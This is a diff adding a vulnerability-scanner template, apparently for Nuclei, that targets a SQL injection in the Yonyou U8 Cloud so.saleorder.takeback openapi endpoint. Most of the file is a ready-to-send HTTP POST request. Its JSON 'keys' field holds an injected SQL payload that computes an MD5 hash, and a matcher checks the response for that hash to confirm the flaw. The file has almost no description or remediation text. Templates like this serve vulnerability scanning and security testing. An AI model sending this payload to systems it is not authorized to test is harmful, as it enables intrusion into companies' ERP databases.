@@ -1,0 +1,38 @@
+id: yonyou-u8-cloud-takeback-sqli
+info:
+  name: 用友U8 Cloud so.saleorder.takeback存在SQL注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://bdziyi.com/66683/
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: yonyou,u8cloud,sqli
+
+http:
+  - raw:
+      - |
+        POST /u8cloud/openapi/so.saleorder.takeback?appcode=huo&isEncrypt=N HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Content-Length: 181
+
+        {
+            "pk_proposer": "1",
+            "operator": "1",
+            "pk_corp": "1",
+            "keys": ["1'and 1=LOWER(CONVERT(VARCHAR(32), HASHBYTES('MD5', '554'), 2))--"]
+        }
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,'5e388103a391daabe3de1d76a6739ccd')
+        condition: and
